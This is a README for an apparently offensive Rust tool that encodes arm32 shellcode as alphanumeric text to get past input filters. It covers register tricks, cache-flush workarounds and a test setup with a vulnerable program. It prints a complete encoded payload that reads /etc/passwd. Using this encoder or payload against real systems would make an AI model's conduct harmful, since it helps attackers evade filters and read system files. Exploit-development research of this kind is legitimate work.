# RASGA32

A Rusty fork of the existing project [asga](https://github.com/pratX/asga/) that consists of transforming some arbitrary *arm32* shellcode into its alphanumeric equivalent.

The main pro of this implementation is that the generated shellcode works on modern *aarch64* (ARMv8) machines that are retrocompatible with *arm32*. The original repo will produce a shellcode that will straight up crash every single time because of architecture issues.

Heavily based on the papers :
- [Filter-resistant code injection on ARM](https://www.fort-knox.org/files/armshellcode.pdf) by Yves Younan and his team
- [pratX](https://github.com/pratX/asga/blob/master/docs/BTP_rep.pdf) that describes its own implementation in his original repository.

## Main issue

Those are the problematic instructions that led me to reimplement the code base in Rust :

```
SUBPL rX, pc, rY, ROR rZ      (builder.c / algo2())
swi #0x9f0002
```

The first instruction triggers SIGILL on *arm32* binaries that are being executed on modern aarch64 machines,
despite being valid instructions at a first glance.

Finally, the syscall that is mentioned in multiple writeups to address to problem of the instruction cache not being flushed does **not exist at all** in the ARM32 EABI ABI syscall tables.

I found it easier to reimplement his whole code base than trying to modify the latter.

## Summary

Registers $R_{\{i=3,j=5,k=7\}}$ are heavily used to perform operations that could be **not alphanumeric**, as they naturally produce alphanumeric instructions.

- $R_i$ stores a constant integer, randomly generated at start. It is mainly used to set values for other registers.
- $R_j$ is equal to -1 (`0xffffffff`).
- $R_k$ stores the result of operations.

Registers $R_{\{4,6\}}$ can also be used to some extend. The others are impossible to manipulate. The only way to change their values is through `lmul()` function, which actually pumps values from the stack.

`sub`, `add`, `mul` are reimplemented through repeated `xor` operations through $R_{i,j,k}$.

The original shellcode is encoded then decoded on site.
The process needs the instruction cache to be flushed multiple times. The workaround found here to circumvent the OABI call `swi #0x9f0002` is to call `syscall(SYS_sync)`.

## Getting started

Print usage :
```
$ cargo run -- --help
```

### Example

With the shellcode that prints out `/etc/passwd` at `passwd.bin` :
```
$ cargo run --bin main -- --src passwd.bin
eX5PeX5Ps5SPwuWPveVPiP5Rj0ERiPER0PORwgEPuWUPzP5RuWGPugFPugFPugFPugFPuWUPiP5RipER0pFUsgFPipER0pFUsgFPipER0pFUsgFPsgFPiPERzP5RuWGPugFPuWUPxP5RzP5RuWGPugFPuWUPiP5Rlp3Rfp7B0pFEipUBsgFP3p3R3p7B0pFEipUBsgFPsp3Rsp7B0pFEipUBsgFPsgFPiPERzP5RuWGPuWUPLP5RTP5RuWGPugFPuWUPiP5RipER0pFUsgFPipER0pFUsgFPipER0pFUsgFPsgFPiPERtETPveVPpPMRcIEVcIEVcIEVcIEVc9EVc9EVc9EVc9EVcIEVcIEVcIEVcIEVXPMRGA5Ywp4RSp7RuTUPiP5Rs4SPvdVPtDTPtDTPtDTPtDTPtDTPtDTPtDTPj0URAAAOip5Bs7SPwwWPtGTPvgVPuWUP00ORwGCPs7SPz03Rs7GPsGDPsGDPs7SPq03R903Rs7GPsGDPs7SPscDPoP5RsP5Rp05B00TUqADP0pTUs57P00FUqaFPqADP8pwRAAAJeX5PeX5Pup5RQp7RiP5Rj0URAAAOs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPs3SPqcPwfgYsrDBPsphcvdppFMJEtoBPUWXcrAPsaWHcvdBPfMiuTorUwvHcptCCqVkSeTBPDmiufmwpoPIqGqfpuqkPDERPMpiswpUPUPzOgpdPmpXagqGpMpJCfbepFBIpVbVQipjCOKPpOPHcEPwpUPjOQ0
```

## Tests

**QEMU is used for the unit testing, as well as the [pwntools](https://github.com/Gallopsled/pwntools) framework (Python3) to read core dumps**.

### QEMU

The reader is expected to have set up QEMU on its Linux system, especially `qemu-arm-static`.

### Python

```
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### Run tests

Supposing that you are on *amd64*, to build `vuln.c` :
```
$ ./build.sh
```

Tests are based on both Rust unittest and Python unittest native frameworks.

To run tests :
```
$ ./run_unit_test.sh [<unit_test>]
```

A *unit test* is named here as `test_XXXX`.
It is implemented by creating a new Rust file of the same name and a new unittest test case in the Python file `tests.py`.
